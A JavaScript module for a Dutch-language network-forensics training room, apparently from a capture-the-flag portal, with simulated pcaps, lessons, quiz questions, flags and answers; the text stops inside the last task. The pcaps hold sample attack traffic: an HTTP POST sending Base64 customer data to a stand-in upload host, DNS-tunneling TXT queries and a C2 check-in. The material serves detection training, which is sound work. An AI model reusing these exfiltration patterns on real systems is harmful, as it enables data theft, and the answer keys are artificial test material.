/* Room: Netwerkforensie — het verkeer vertelt het verhaal */

// --- pcap A: HTTP-exfiltratie via POST ---
const PCAP_EXFIL = [
  { no: 1, time: '0.000', src: '10.10.80.5', dst: '10.10.80.1', proto: 'DNS', len: 74, info: 'Standaardquery A intranet.jvt.lab' },
  { no: 2, time: '0.012', src: '10.10.80.1', dst: '10.10.80.5', proto: 'DNS', len: 90, info: 'Antwoord A intranet.jvt.lab = 10.10.50.10' },
  { no: 3, time: '0.040', src: '10.10.80.5', dst: '10.10.50.10', proto: 'TCP', len: 74, info: '51012 -> 80 [SYN]' },
  { no: 4, time: '0.052', src: '10.10.50.10', dst: '10.10.80.5', proto: 'TCP', len: 74, info: '80 -> 51012 [SYN, ACK]' },
  { no: 5, time: '0.061', src: '10.10.80.5', dst: '10.10.50.10', proto: 'HTTP', len: 421, info: 'GET / HTTP/1.1' },
  { no: 6, time: '0.088', src: '10.10.50.10', dst: '10.10.80.5', proto: 'HTTP', len: 1240, info: 'HTTP/1.1 200 OK (text/html)' },
  { no: 7, time: '0.140', src: '10.10.80.5', dst: '10.10.50.10', proto: 'HTTP', len: 398, info: 'GET /css/stijl.css HTTP/1.1' },
  { no: 8, time: '0.160', src: '10.10.50.10', dst: '10.10.80.5', proto: 'HTTP', len: 980, info: 'HTTP/1.1 200 OK (text/css)' },
  { no: 9, time: '42.510', src: '10.10.80.5', dst: '10.10.90.20', proto: 'DNS', len: 78, info: 'Standaardquery A upload.jvt.lab' },
  { no: 10, time: '42.522', src: '10.10.80.5', dst: '10.10.90.20', proto: 'TCP', len: 74, info: '51044 -> 80 [SYN]' },
  { no: 11, time: '42.534', src: '10.10.90.20', dst: '10.10.80.5', proto: 'TCP', len: 74, info: '80 -> 51044 [SYN, ACK]' },
  {
    no: 12, time: '42.540', src: '10.10.80.5', dst: '10.10.90.20', proto: 'HTTP', len: 4312,
    info: 'POST /upload HTTP/1.1  (data 4.096 bytes!)',
    stream: `POST /upload HTTP/1.1
Host: upload.jvt.lab
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)
Content-Type: application/x-www-form-urlencoded
Content-Length: 4096
X-Note: JVT{http_exfiltratie}

bestand=klanten_export.csv&data=a2xhbnQ7aWJhbjtzYWxkbwpKLkphbnNlbjtOTDIySlZUQjAxMjM0NTY3ODk7MTg0NTAKRi5CYWtrZXI7Tkw5MEpWVEIwOTg3NjU0MzIxOzkyMzA=

HTTP/1.1 200 OK
Server: nginx
Content-Length: 2

ok`,
  },
  { no: 13, time: '42.690', src: '10.10.90.20', dst: '10.10.80.5', proto: 'HTTP', len: 215, info: 'HTTP/1.1 200 OK (text/plain)' },
  { no: 14, time: '42.701', src: '10.10.80.5', dst: '10.10.90.20', proto: 'TCP', len: 66, info: '51044 -> 80 [ACK]' },
  { no: 15, time: '55.100', src: '10.10.80.5', dst: '10.10.50.10', proto: 'HTTP', len: 402, info: 'GET /nieuws HTTP/1.1' },
  { no: 16, time: '55.130', src: '10.10.50.10', dst: '10.10.80.5', proto: 'HTTP', len: 1560, info: 'HTTP/1.1 200 OK (text/html)' },
];

// --- pcap B: DNS-tunneling ---
const PCAP_DNS = [
  { no: 1, time: '0.000', src: '10.10.80.5', dst: '10.10.80.1', proto: 'DNS', len: 80, info: 'Standaardquery A tijd.jvt.lab' },
  { no: 2, time: '0.015', src: '10.10.80.1', dst: '10.10.80.5', proto: 'DNS', len: 96, info: 'Antwoord A tijd.jvt.lab = 10.10.50.3' },
  { no: 3, time: '8.200', src: '10.10.80.5', dst: '10.10.90.53', proto: 'DNS', len: 142, info: 'Standaardquery TXT mz2wk3-chunk00-aegh5t7q.exfil.jvt.lab' },
  { no: 4, time: '8.240', src: '10.10.90.53', dst: '10.10.80.5', proto: 'DNS', len: 188, info: 'Antwoord TXT (geen A) exfil.jvt.lab' },
  { no: 5, time: '8.900', src: '10.10.80.5', dst: '10.10.90.53', proto: 'DNS', len: 146, info: 'Standaardquery TXT nf4xq1-chunk01-k9plm2wd.exfil.jvt.lab' },
  { no: 6, time: '8.945', src: '10.10.90.53', dst: '10.10.80.5', proto: 'DNS', len: 190, info: 'Antwoord TXT (geen A) exfil.jvt.lab' },
  { no: 7, time: '9.610', src: '10.10.80.5', dst: '10.10.90.53', proto: 'DNS', len: 150, info: 'Standaardquery TXT pq7za9-chunk02-r3nxc8vb.exfil.jvt.lab' },
  { no: 8, time: '9.655', src: '10.10.90.53', dst: '10.10.80.5', proto: 'DNS', len: 192, info: 'Antwoord TXT (geen A) exfil.jvt.lab' },
  { no: 9, time: '10.320', src: '10.10.80.5', dst: '10.10.90.53', proto: 'DNS', len: 148, info: 'Standaardquery TXT ub6yh2-chunk03-t5mwe1qz.exfil.jvt.lab' },
  { no: 10, time: '10.366', src: '10.10.90.53', dst: '10.10.80.5', proto: 'DNS', len: 194, info: 'Antwoord TXT (geen A) exfil.jvt.lab' },
  { no: 11, time: '11.010', src: '10.10.80.5', dst: '10.10.90.53', proto: 'DNS', len: 152, info: 'Standaardquery TXT wc8ij4-chunk04-v7qra3xs.exfil.jvt.lab' },
  {
    no: 12, time: '11.058', src: '10.10.90.53', dst: '10.10.80.5', proto: 'DNS', len: 210,
    info: 'Antwoord TXT (geen A) exfil.jvt.lab',
    stream: `DNS-tunnel — gereconstrueerde TXT-conversatie met 10.10.90.53 (rogue nameserver)

Query  TXT  mz2wk3-chunk00-aegh5t7q.exfil.jvt.lab
Reply  TXT  "ack=0"
Query  TXT  nf4xq1-chunk01-k9plm2wd.exfil.jvt.lab
Reply  TXT  "ack=1"
...
Query  TXT  wc8ij4-chunk04-v7qra3xs.exfil.jvt.lab
Reply  TXT  "ack=4 klaar; tag=JVT{dns_tunnel_betrapt}"

Analist: het "domein" exfil.jvt.lab wordt misbruikt als datakanaal. De lange,
willekeurige subdomeinen zijn stukjes (chunks) van gestolen data, gecodeerd en
uitgesmokkeld via DNS-queries. Normale clients vragen geen tientallen TXT-records op.`,
  },
  { no: 13, time: '11.700', src: '10.10.80.5', dst: '10.10.90.53', proto: 'DNS', len: 150, info: 'Standaardquery TXT xd9ko5-chunk05-w1sbt4yd.exfil.jvt.lab' },
  { no: 14, time: '11.744', src: '10.10.90.53', dst: '10.10.80.5', proto: 'DNS', len: 196, info: 'Antwoord TXT (geen A) exfil.jvt.lab' },
  { no: 15, time: '12.400', src: '10.10.80.5', dst: '10.10.90.53', proto: 'DNS', len: 154, info: 'Standaardquery TXT ye1lp6-chunk06-x2tcu5ze.exfil.jvt.lab' },
  { no: 16, time: '12.448', src: '10.10.90.53', dst: '10.10.80.5', proto: 'DNS', len: 198, info: 'Antwoord TXT (geen A) exfil.jvt.lab' },
];

// --- pcap C: C2-beaconing ---
const PCAP_C2 = [
  { no: 1, time: '0.000', src: '10.10.80.5', dst: '10.10.70.13', proto: 'TCP', len: 74, info: '52880 -> 443 [SYN]' },
  { no: 2, time: '0.031', src: '10.10.70.13', dst: '10.10.80.5', proto: 'TCP', len: 74, info: '443 -> 52880 [SYN, ACK]' },
  { no: 3, time: '0.060', src: '10.10.80.5', dst: '10.10.70.13', proto: 'TLS', len: 281, info: 'Application Data (check-in)',
    stream: `C2-baken — gereconstrueerde check-in naar 10.10.70.13:443 (elke ~30s identiek)

>> POST /gate.php HTTP/1.1
>> Host: cdn-sync.jvt.lab
>> User-Agent: Mozilla/5.0
>> Content-Length: 9
>>
>> id=WS-FINANCE-07
<< HTTP/1.1 200 OK
<< Content-Length: 24
<<
<< sleep=30; tag=JVT{c2_baken}

Analist: elke 30 seconden exact dezelfde kleine verbinding naar hetzelfde IP.
Dat regelmatige ritme ("beaconing") is typisch voor malware die bij zijn
command-and-control-server om opdrachten vraagt.` },
  { no: 4, time: '30.061', src: '10.10.80.5', dst: '10.10.70.13', proto: 'TLS', len: 281, info: 'Application Data (check-in)' },
  { no: 5, time: '30.094', src: '10.10.70.13', dst: '10.10.80.5', proto: 'TLS', len: 140, info: 'Application Data (antwoord)' },
  { no: 6, time: '60.062', src: '10.10.80.5', dst: '10.10.70.13', proto: 'TLS', len: 281, info: 'Application Data (check-in)' },
  { no: 7, time: '60.095', src: '10.10.70.13', dst: '10.10.80.5', proto: 'TLS', len: 140, info: 'Application Data (antwoord)' },
  { no: 8, time: '90.063', src: '10.10.80.5', dst: '10.10.70.13', proto: 'TLS', len: 281, info: 'Application Data (check-in)' },
  { no: 9, time: '90.096', src: '10.10.70.13', dst: '10.10.80.5', proto: 'TLS', len: 140, info: 'Application Data (antwoord)' },
  { no: 10, time: '120.064', src: '10.10.80.5', dst: '10.10.70.13', proto: 'TLS', len: 281, info: 'Application Data (check-in)' },
  { no: 11, time: '120.097', src: '10.10.70.13', dst: '10.10.80.5', proto: 'TLS', len: 140, info: 'Application Data (antwoord)' },
  { no: 12, time: '122.300', src: '10.10.80.5', dst: '10.10.50.10', proto: 'HTTP', len: 420, info: 'GET /intranet HTTP/1.1 (normaal verkeer)' },
  { no: 13, time: '150.065', src: '10.10.80.5', dst: '10.10.70.13', proto: 'TLS', len: 281, info: 'Application Data (check-in)' },
  { no: 14, time: '150.098', src: '10.10.70.13', dst: '10.10.80.5', proto: 'TLS', len: 140, info: 'Application Data (antwoord)' },
];

CS.registerRoom({
  id: 'netwerk-forensie',
  path: 'forensie',
  order: 5,
  title: 'Netwerkforensie: het verkeer vertelt het verhaal',
  icon: '🌐',
  difficulty: 'Gemiddeld',
  minutes: 70,
  summary: 'Een pcap is een opname van netwerkverkeer. Je leert met de Wireshark-aanpak datadiefstal (exfiltratie), een C2-baken en DNS-tunneling uit de pakketten vissen, en een conversatie reconstrueren met Follow Stream.',
  objectives: [
    'Uitleggen wat een pcap is en hoe je verkeer legaal en veilig vastlegt',
    'De Wireshark-workflow gebruiken: Conversations, Follow Stream en Export Objects',
    'Display filters inzetten (http, dns, ip.addr, tcp.port, http.request.method)',
    'Data-exfiltratie via een grote uitgaande HTTP-POST herkennen en de buit reconstrueren',
    'Een C2-baken (regelmatige kleine verbindingen) in de pakketlijst herkennen',
    'DNS-tunneling herkennen aan ongewone TXT-queries met lange subdomeinen',
  ],
  tasks: [
    {
      title: 'Taak 1 — Wat is een pcap?',
      content: `
        <p>Als digitaal rechercheur wil je soms precies weten wat er over het netwerk ging: welke computer praatte met
        welke server, en wát er werd verstuurd. Daarvoor leg je het verkeer vast in een <strong>pcap</strong> (packet
        capture): een bestand met een kopie van alle <strong>pakketten</strong> die voorbijkwamen. Elk pakketje bevat
        onder meer het bron-IP, het bestemmings-IP, het protocol en (vaak) de inhoud.</p>

        <h3>De analogie van de telefooncentrale</h3>
        <p>Denk aan een ouderwetse telefooncentrale die elk gesprek kan opnemen. Een pcap is zo'n opname, maar dan van
        álle netwerkgesprekken. Loop je ze later terug, dan hoor je precies wie wanneer belde — en bij onversleuteld
        verkeer zelfs wat er gezegd werd.</p>

        <h3>Hoe ontstaat een pcap?</h3>
        <p>Je legt verkeer vast met tools als <strong>tcpdump</strong> (opnemen op de commandoregel) of
        <strong>Wireshark</strong> (opnemen én grafisch analyseren). Het resultaat is een bestand, meestal met de
        extensie <code>.pcap</code> of <code>.pcapng</code>, bijvoorbeeld <code>zaak-042.pcap</code>.</p>

        <div class="callout danger">
          <strong>Ethiek en wet:</strong> netwerkverkeer afluisteren raakt direct aan het telecommunicatiegeheim en de
          privacy. Je doet dit alleen op je eigen netwerk, in je eigen lab, of met een geldige
          <strong>machtiging</strong>. Bij de politie (<strong>Team Cybercrime</strong>) gebeurt een tap op last van de
          rechter-commissaris. Onbevoegd aftappen is strafbaar. In deze room werk je op gesimuleerde pcaps in een
          afgeschermd lab met fictieve adressen (<code>10.10.x.x</code>) en domeinen (<code>*.jvt.lab</code>).
        </div>

        <div class="callout info">
          <strong>Versleuteld of niet?</strong> Veel verkeer is tegenwoordig versleuteld (HTTPS/TLS). Dan zie je in de
          pcap wél <em>wie met wie</em> praat, hoe vaak en hoeveel, maar niet de inhoud. Dat "metadata"-niveau verraadt
          vaak al genoeg, zoals je verderop bij C2-beaconing ziet.
        </div>
      `,
      questions: [
        { q: 'Wat is een pcap?', options: ['Een opgenomen bestand met netwerkpakketten', 'Een soort firewall', 'Een versleutelde harde schijf', 'Een wachtwoordkraker'], answer: 0, explain: 'Een pcap (packet capture) is een opname van het netwerkverkeer: de pakketten met bron, bestemming, protocol en inhoud.' },
        { q: 'Met welke tool kun je verkeer zowel opnemen als grafisch analyseren?', answer: ['Wireshark', 'wireshark'], hint: 'Het bekendste analyseprogramma, met een haaienvin-logo.', explain: 'Wireshark neemt op én analyseert; tcpdump neemt vooral op via de commandoregel.' },
        { q: 'Wat zie je in een pcap als het verkeer met HTTPS/TLS is versleuteld?', options: ['Wie met wie praat en hoeveel, maar niet de inhoud', 'Helemaal niets', 'De volledige inhoud, altijd leesbaar', 'Alleen wachtwoorden'], answer: 0, explain: 'Bij versleuteld verkeer blijft de metadata (adressen, timing, volume) zichtbaar, de inhoud niet.' },
        { q: 'Ik begrijp dat ik verkeer alleen met toestemming of machtiging mag aftappen.', noAnswer: true },
      ],
    },

    {
      title: 'Taak 2 — De Wireshark-workflow',
      content: `
        <p>Een pcap kan miljoenen pakketten bevatten. Zonder methode verdrink je. Profis volgen een vast stramien. Drie
        onderdelen van Wireshark gebruik je bijna altijd.</p>

        <h3>1. Statistics &rarr; Conversations</h3>
        <p>Dit geeft een overzicht van alle "gesprekken": welk IP praatte met welk IP, en hoeveel pakketten en
        <strong>bytes</strong> daarbij hoorden. Sorteer je op bytes (grootste bovenaan), dan springt een
        <strong>grote overdracht</strong> er meteen uit. Zie je dat één interne computer opvallend veel data naar een
        onbekend extern IP stuurde, dan is dat je eerste verdachte: mogelijke data-exfiltratie.</p>

        <h3>2. Follow &rarr; TCP Stream</h3>
        <p>Een enkele conversatie zit verspreid over veel losse pakketten. Met <strong>Follow TCP Stream</strong> plakt
        Wireshark ze weer aan elkaar tot één leesbaar geheel: precies wat de ene kant stuurde en de andere antwoordde.
        Bij een onversleutelde HTTP-sessie lees je zo de hele aanvraag en het antwoord — inclusief verzonden data.</p>

        <h3>3. File &rarr; Export Objects</h3>
        <p>Werden er bestanden overgedragen (bijvoorbeeld via HTTP), dan haalt <strong>Export Objects</strong> ze er zo
        uit: Wireshark reconstrueert het verstuurde bestand en zet het op je schijf. Handig om te zien wélk document is
        buitgemaakt of wélke malware is gedownload.</p>

        <div class="callout tip">
          <strong>De aanpak in het kort:</strong> begin breed met <em>Conversations</em> (wie, hoeveel) &rarr; zoom in op
          de verdachte met <em>Follow Stream</em> (wat precies) &rarr; haal bewijs eruit met <em>Export Objects</em> (het
          bestand zelf). In dit portaal werk je met een Wireshark-light: je krijgt de pakketlijst met een filter, en bij
          een verdacht pakket kun je de "Follow stream" openen.
        </div>
      `,
      questions: [
        { q: 'Welk Wireshark-overzicht gebruik je om snel te zien wie met wie praat en wie de meeste bytes verstuurde?', answer: ['Conversations', 'conversations', 'Statistics Conversations'], hint: 'Je vindt het onder het menu Statistics.', explain: 'Statistics -> Conversations toont per gesprek de pakketten en bytes; sorteren op bytes legt grote overdrachten bloot.' },
        { q: 'Hoe heet de functie die losse pakketten van één gesprek weer tot één leesbaar geheel plakt?', answer: ['Follow TCP Stream', 'Follow Stream', 'follow tcp stream', 'follow stream'], hint: 'Je "volgt" de stroom van een conversatie.', explain: 'Follow TCP Stream reconstrueert de hele conversatie, zodat je aanvraag en antwoord in één keer leest.' },
        { q: 'Je wilt het daadwerkelijk overgedragen bestand uit een HTTP-sessie terughalen. Wat gebruik je?', options: ['File -> Export Objects', 'Edit -> Preferences', 'View -> Coloring Rules', 'Help -> About'], answer: 0, explain: 'Export Objects reconstrueert overgedragen bestanden (bijv. via HTTP) en slaat ze op.' },
        { q: 'Wat is een slimme volgorde van onderzoek?', options: ['Conversations (breed) -> Follow Stream (inzoomen) -> Export Objects (bewijs)', 'Meteen elk pakket los lezen', 'Alleen naar het laatste pakket kijken', 'De pcap verwijderen'], answer: 0, explain: 'Breed beginnen en dan inzoomen bespaart tijd en voorkomt dat je het signaal in de ruis mist.' },
      ],
    },

    {
      title: 'Taak 3 — Display filters: het verkeer schiften',
      content: `
        <p>Het krachtigste gereedschap in Wireshark is het <strong>display filter</strong>: een zoekregel die alleen de
        pakketten toont die je wilt zien. Leer deze paar filters, dan kom je een heel eind. In de pcap-labs hieronder
        typ je ze (of een stukje ervan) in het filtervak; je kunt ook een <code>/regex/</code> gebruiken.</p>

        <table>
          <thead><tr><th>Filter</th><th>Toont</th></tr></thead>
          <tbody>
            <tr><td><code>http</code></td><td>Alleen HTTP-verkeer (webverzoeken en -antwoorden)</td></tr>
            <tr><td><code>dns</code></td><td>Alleen DNS-verkeer (naamopvragingen)</td></tr>
            <tr><td><code>ip.addr==10.10.90.20</code></td><td>Alles van of naar dat IP-adres</td></tr>
            <tr><td><code>tcp.port==443</code></td><td>Alleen verkeer op poort 443 (HTTPS)</td></tr>
            <tr><td><code>http.request.method=="POST"</code></td><td>Alleen HTTP-POST-verzoeken (vaak: data die naar buiten gaat)</td></tr>
          </tbody>
        </table>

        <h3>Wat elk filter verraadt</h3>
        <ul>
          <li>Met <code>http.request.method=="POST"</code> vind je in één klap alle plekken waar een client <em>data
          verstuurt</em> naar een server. Grote POST's naar een onbekend extern IP zijn een rode vlag voor exfiltratie.</li>
          <li>Met <code>dns</code> zie je alle naamopvragingen. Opeens tientallen vreemde, lange subdomeinen? Dan ruik je
          DNS-tunneling.</li>
          <li>Met <code>ip.addr==</code> isoleer je één verdachte en zie je in één lijst alles wat die deed.</li>
        </ul>

        <div class="callout warn">
          <strong>Credential-diefstal in platte HTTP:</strong> stuurt een inlogformulier het wachtwoord over gewoon
          <code>http://</code> (dus zonder TLS), dan staat dat wachtwoord <em>leesbaar</em> in de pcap. Met
          <code>http.request.method=="POST"</code> en daarna Follow Stream lees je bij zo'n login zo de gebruikersnaam en
          het wachtwoord mee. Dat is precies waarom inloggen altijd over HTTPS hoort te gaan.
        </div>
      `,
      questions: [
        { q: 'Welk display filter toont alleen HTTP-POST-verzoeken?', answer: ['http.request.method=="POST"', 'http.request.method == "POST"'], hint: 'Begin met http.request.method en vergelijk met "POST".', explain: 'http.request.method=="POST" isoleert alle POST-verzoeken, vaak de plek waar data naar buiten gaat.' },
        { q: 'Welk filter toont alles van en naar het IP-adres 10.10.90.20?', answer: ['ip.addr==10.10.90.20', 'ip.addr == 10.10.90.20'], hint: 'Gebruik het veld ip.addr met ==.', explain: 'ip.addr==10.10.90.20 isoleert één host: alles wat die verstuurde en ontving.' },
        { q: 'Waarom is inloggen over platte http:// gevaarlijk in een pcap-onderzoek?', options: ['De gebruikersnaam en het wachtwoord staan leesbaar in de pakketten', 'HTTP werkt niet met wachtwoorden', 'Het is te langzaam', 'DNS blokkeert het'], answer: 0, explain: 'Zonder TLS reist de inhoud (ook wachtwoorden) onversleuteld mee en is die in de pcap te lezen.' },
      ],
    },

    {
      title: 'Taak 4 — pcap A: data-exfiltratie via HTTP-POST',
      content: `
        <p>Eerste zaak. Een werkstation op de financiële afdeling (<code>10.10.80.5</code>) gedraagt zich vreemd. Je hebt
        een pcap van een paar minuten verkeer. Vermoeden: er is bedrijfsdata naar buiten gesmokkeld
        (<strong>exfiltratie</strong>). Zoek de uitgaande overdracht en reconstrueer wat er precies werd gestolen.</p>

        <h3>Zo pak je het aan</h3>
        <ol>
          <li><strong>Filter op HTTP.</strong> Typ <code>http</code> in het filter. Je ziet een paar normale
          GET-verzoeken naar het intranet (<code>10.10.50.10</code>) — en daartussen iets anders.</li>
          <li><strong>Zoek de POST.</strong> Een <code>GET</code> haalt een pagina op; een <strong><code>POST</code></strong>
          stuurt data <em>naar</em> een server. Zoek het <code>POST</code>-pakket. Let op de lengte (<code>len</code>):
          dit pakket is veel groter dan de rest — daar gaat data naar buiten.</li>
          <li><strong>Volg de stream.</strong> Klik het POST-pakket aan en open "Follow stream". Je leest nu de volledige
          HTTP-POST: naar welke host, welk bestand, en de meegestuurde data. Ergens in de kop staat ook een notitie met
          de vlag.</li>
        </ol>

        <div class="callout tip">
          <strong>Tip:</strong> het exfil-pakket gaat naar het externe IP <code>10.10.90.20</code> (host
          <code>upload.jvt.lab</code>) — géén intern adres uit <code>10.10.50.x</code>. De meegestuurde <code>data=</code>
          is Base64; dat is de buit (een klantenexport), alleen even gecodeerd zodat het niet opvalt. Codering is geen
          encryptie: je zou het zo kunnen terugdraaien.
        </div>
      `,
      lab: { type: 'pcap', title: 'zaak-042-exfil.pcap', packets: PCAP_EXFIL },
      questions: [
        { q: 'Met welke HTTP-methode werd de data naar buiten gestuurd?', answer: ['POST', 'post'], hint: 'Niet GET (ophalen), maar de methode die data verstuurt.', explain: 'Een POST stuurt data naar de server; het grote POST-pakket is de exfiltratie.' },
        { q: 'Naar welk extern IP-adres werd de data geexfiltreerd?', answer: ['10.10.90.20'], hint: 'Kijk naar de bestemming (dst) van het grote POST-pakket; het is geen 10.10.50.x-adres.', explain: 'Het POST-pakket ging naar 10.10.90.20 (upload.jvt.lab), buiten het normale intranetbereik.' },
        { q: 'Welke vlag staat in de HTTP-kop van de POST (Follow stream)?', answer: ['JVT{http_exfiltratie}'], encoded: true, hint: 'Open Follow stream op het POST-pakket en lees de X-Note-regel.', explain: 'In de header X-Note staat JVT{http_exfiltratie}; de data= eronder is de Base64-gecodeerde buit.' },
        { q: 'Hoe kun je aan de pakketlijst alleen al zien welk pakket de exfiltratie is?', options: ['Het is veel groter (len) dan de andere en is een POST naar een extern IP', 'Het is het eerste pakket', 'Het gebruikt DNS', 'Het heeft de laagste lengte'], answer: 0, explain: 'Een opvallend grote uitgaande POST naar een onbekend extern IP is de klassieke signatuur van exfiltratie.' },
      ],
    },

    {
      title: 'Taak 5 — pcap B: DNS-tunneling',
      content: `
        <p>Tweede zaak, lastiger. Soms gaat er geen grote POST naar buiten, maar sijpelt data weg via een kanaal dat
        bijna nooit geblokkeerd wordt: <strong>DNS</strong>. Elk netwerk moet namen kunnen opzoeken, dus DNS mag meestal
        gewoon naar buiten. Aanvallers misbruiken dat met <strong>DNS-tunneling</strong>: ze stoppen gestolen data in de
        <em>naam</em> die ze opvragen.</p>

        <h3>Hoe ziet dat eruit?</h3>
        <p>Normaal vraagt een computer af en toe een A-record op (<code>naam &rarr; IP-adres</code>). Bij DNS-tunneling
        zie je in plaats daarvan:</p>
        <ul>
          <li><strong>Veel TXT-queries</strong> (het TXT-type kan willekeurige tekst bevatten — ideaal om data in te
          verstoppen).</li>
          <li><strong>Lange, willekeurig ogende subdomeinen</strong> zoals
          <code>mz2wk3-chunk00-aegh5t7q.exfil.jvt.lab</code>. Elk stukje (chunk) is een brokje gecodeerde data.</li>
          <li>Alles naar <strong>hetzelfde "domein"</strong> en dezelfde (rogue) nameserver.</li>
        </ul>

        <h3>Zo pak je het aan</h3>
        <ol>
          <li>Filter op <code>dns</code>. Je ziet een stortvloed van TXT-queries — geen gewone A-opvragingen.</li>
          <li>Kijk naar het domein dat steeds terugkomt achter de rare subdomeinen. Dat is het exfiltratiekanaal.</li>
          <li>Open de "Follow stream" bij een van de DNS-antwoorden om de gereconstrueerde conversatie en de vlag te
          lezen.</li>
        </ol>

        <div class="callout info">
          <strong>Waarom dit werkt:</strong> firewalls laten DNS bijna altijd door. Door data in subdomeinen te
          verpakken, "tunnelt" de aanvaller zijn verkeer dwars door de firewall heen. Het patroon (tientallen lange
          TXT-queries naar één domein) is juist de manier om het te betrappen.
        </div>
      `,
      lab: { type: 'pcap', title: 'zaak-042-dns.pcap', packets: PCAP_DNS },
      questions: [
        { q: 'Welke techniek zie je hier: data weglekken via DNS-queries?', answer: ['DNS-tunneling', 'dns-tunneling', 'dns tunneling', 'dns-tunnel'], hint: 'Data wordt door DNS heen "getunneld".', explain: 'DNS-tunneling verpakt gestolen data in (sub)domeinnamen en TXT-queries die door de firewall mogen.' },
        { q: 'Welk "domein" wordt misbruikt als datakanaal (het deel achter de willekeurige subdomeinen)?', answer: ['exfil.jvt.lab'], hint: 'Kijk wat er steeds achter de rare chunk-namen staat.', explain: 'Alle TXT-queries eindigen op exfil.jvt.lab: dat is het exfiltratiekanaal naar de rogue nameserver 10.10.90.53.' },
        { q: 'Welk DNS-recordtype wordt misbruikt om willekeurige tekst te vervoeren?', answer: ['TXT', 'txt'], hint: 'Niet A of MX; het type dat vrije tekst kan bevatten.', explain: 'Het TXT-record mag willekeurige tekst bevatten en is daardoor geliefd voor tunneling.' },
        { q: 'Welke vlag staat in de gereconstrueerde DNS-conversatie (Follow stream)?', answer: ['JVT{dns_tunnel_betrapt}'], encoded: true, hint: 'Open Follow stream op het DNS-antwoord en lees de laatste TXT-reply (tag=...).', explain: 'In het laatste TXT-antwoord staat tag=JVT{dns_tunnel_betrapt}.' },
      ],
    },

    {
      title: 'Taak 6 — pcap C: het C2-baken',
      content: `
        <p>Derde zaak. Hier is het verkeer versleuteld (TLS, poort 443), dus de inhoud kun je niet zomaar lezen. Toch
        verraadt deze malware zich — door zijn <strong>ritme</strong>. Besmette systemen vragen hun
        <strong>command-and-control</strong>-server (C2) regelmatig om nieuwe opdrachten. Dat regelmatige "ping naar
        huis" heet <strong>beaconing</strong> (een baken dat steeds knippert).</p>

        <h3>Het patroon herkennen</h3>
        <p>Scrol door de pakketlijst en let op de <strong>tijdstempels</strong> en de <strong>lengte</strong>:</p>
        <ul>
          <li>Steeds hetzelfde interne IP (<code>10.10.80.5</code>) dat contact zoekt met hetzelfde externe IP.</li>
          <li>Op <strong>vaste intervallen</strong> (hier elke ~30 seconden) een kleine, bijna <em>even grote</em>
          verbinding. Mensen surfen grillig; malware tikt als een klok.</li>
          <li>Tussendoor af en toe gewoon, normaal verkeer — de beacon zit ertussen verstopt.</li>
        </ul>

        <h3>Zo pak je het aan</h3>
        <ol>
          <li>Kijk welk extern IP keer op keer, op regelmatige tijden, terugkeert. Dat is de C2-server.</li>
          <li>Filter desnoods met <code>ip.addr==</code> op dat IP om alleen de beacons over te houden en het strakke
          ritme te zien.</li>
          <li>Open de "Follow stream" bij de eerste check-in om de gereconstrueerde opdracht en de vlag te lezen.</li>
        </ol>

        <div class="callout tip">
          <strong>Tip:</strong> zelfs als je de inhoud niet kunt lezen (TLS), verraadt de <em>metadata</em> — vast
          interval, vaste grootte, vast doel — het baken. Dit is precies waarom netwerkdetectie ook bij versleuteld
          verkeer werkt.
        </div>
      `,
      lab: { type: 'pcap', title: 'zaak-042-c2.pcap', packets: PCAP_C2 },
      questions: [
        { q: 'Hoe heet het patroon van regelmatige kleine verbindingen naar de C2-server?', answer: ['beaconing', 'beacon', 'c2-beaconing', 'c2 beaconing'], hint: 'Als een baken dat steeds "knippert".', explain: 'Beaconing: het besmette systeem checkt op vaste intervallen in bij zijn command-and-control-server.' },
        { q: 'Naar welk extern IP-adres gaat het C2-baken (elke ~30 seconden)?', answer: ['10.10.70.13'], hint: 'Welk extern IP keert op vaste tijden met dezelfde pakketlengte terug?', explain: 'Alle check-ins van 10.10.80.5 gaan naar 10.10.70.13:443, telkens 281 bytes — een strak ritme.' },
        { q: 'Waardoor valt dit baken op, ook al is het verkeer versleuteld (TLS)?', options: ['Het vaste interval en de vaste pakketgrootte (metadata)', 'De leesbare inhoud', 'Een foutmelding', 'De gebruikersnaam'], answer: 0, explain: 'De metadata (regelmatig interval, constante grootte, vast doel) verraadt het baken, zelfs zonder de inhoud te zien.' },
        { q: 'Welke vlag staat in de gereconstrueerde C2-check-in (Follow stream)?', answer: ['JVT{c2_baken}'], encoded: true, hint: 'Open Follow stream op het eerste check-in-pakket en lees de serverrespons (tag=...).', explain: 'De C2-server antwoordt met sleep=30; tag=JVT{c2_baken}.' },
      ],
    },

    {
      title: 'Taak 7 — Signalen op een rij en je rapport',
      content: `
        <p>Je hebt nu drie klassieke netwerkaanvallen uit pcaps gevist. Laten we de herkenningspunten naast elkaar
        zetten, want als rechercheur wil je ze snel uit elkaar kunnen houden.</p>

        <table>
          <thead><tr><th>Aanval</th><th>Hoe je het ziet in de pcap</th></tr></thead>
          <tbody>
            <tr><td><strong>Data-exfiltratie</strong></td><td>Grote uitgaande overdracht (vaak HTTP-POST) naar een onbekend extern IP; springt eruit in Conversations op bytes.</td></tr>
            <tr><td><strong>C2-beaconing</strong></td><td>Regelmatige, kleine, bijna even grote verbindingen naar hetzelfde externe IP op een vast interval.</td></tr>
            <tr><td><strong>DNS-tunneling</strong></td><td>Veel TXT-queries met lange, willekeurige subdomeinen naar één (rogue) domein.</td></tr>
            <tr><td><strong>Credential-diefstal</strong></td><td>Inloggegevens leesbaar in platte HTTP (POST naar /login zonder TLS); zichtbaar via Follow Stream.</td></tr>
          </tbody>
        </table>

        <h3>Van pcap naar rapport</h3>
        <p>Net als bij geheugenforensie scheid je in je verslag <strong>feiten</strong> van <strong>interpretatie</strong>.
        Feit: "werkstation 10.10.80.5 stuurde om 42,5 s een HTTP-POST van 4 KB naar 10.10.90.20". Interpretatie: "dit
        duidt vermoedelijk op exfiltratie van een klantenexport". Je werk is <strong>reproduceerbaar</strong>: vermeld
        de pcap, de hash ervan, en de exacte filters die je gebruikte, zodat een collega bij dezelfde pcap tot dezelfde
        conclusie komt.</p>

        <div class="callout info">
          <strong>Melden en samenwerken:</strong> vind je een echt datalek met persoonsgegevens (zoals die klantenexport),
          dan geldt mogelijk een meldplicht bij de <strong>Autoriteit Persoonsgegevens</strong>, en bij een strafbaar
          feit kun je aangifte doen bij de <strong>Politie</strong>. Het <strong>NCSC</strong> deelt indicatoren (zoals
          een C2-IP) zodat anderen zich kunnen wapenen.
        </div>

        <p>Goed gedaan: je kunt nu in netwerkverkeer de drie grote patronen herkennen en een conversatie reconstrueren.
        Dat is de kern van netwerkforensie.</p>
      `,
